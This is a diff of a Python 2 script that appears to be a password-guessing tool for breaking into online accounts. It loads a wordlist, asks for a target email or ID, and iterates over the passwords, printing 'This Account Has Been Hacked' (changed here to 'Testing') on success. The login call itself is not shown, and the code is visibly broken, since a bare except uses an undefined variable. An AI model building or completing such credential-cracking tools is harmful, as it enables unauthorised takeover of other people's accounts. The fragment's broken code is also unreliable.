@@ -54,23 +54,19 @@ print '[2] exit'
 option = input('==>')
 if option == 1:
    file_path = raw_input('path of passwords file :')
-else:
-   system('clear')
-   exit()
-pass_file = open(file_path,'r')
-pass_list = pass_file.readlines()
-def login():
-    i = 0
-    user_name = raw_input('target email / ID')
-    for password in pass_list:
+   pass_file = open(file_path,'r')
+   pass_list = pass_file.readlines()
+   i = 0
+   user_name = raw_input('target email / ID')
+   for password in pass_list:
       i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
          print("Wait!..")
 
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
-         break
+         print '[+] Testing :' + password + '     ^_^'
+         time.sleep(1)
       except :
          error = str(e)
          if error[14] == '<':
@@ -82,3 +78,6 @@ def login():
          else:
             print '[!] password not found => ' + password
 
+else:
+   system('clear')
+   exit()
